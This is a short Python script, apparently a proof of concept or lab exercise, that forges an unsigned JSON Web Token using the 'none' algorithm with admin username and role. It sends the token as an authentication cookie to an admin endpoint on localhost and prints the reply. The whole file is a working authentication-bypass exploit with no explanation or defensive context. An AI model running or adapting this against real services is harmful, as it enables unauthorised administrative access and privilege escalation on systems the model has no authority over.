import requests
import base64
import json
header = {"alg": "none", "typ": "JWT"}
payload = {"username": "admin", "role": "admin"}
def base64url_encode(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().replace("=", "")
malicious_token = f"{base64url_encode(header)}.{base64url_encode(payload)}."
print(malicious_token)
url = "http://localhost:5000/admin"
headers = {"Cookie": f"auth={malicious_token}"}
response = requests.get(url, headers=headers)
print("Response:", response.text)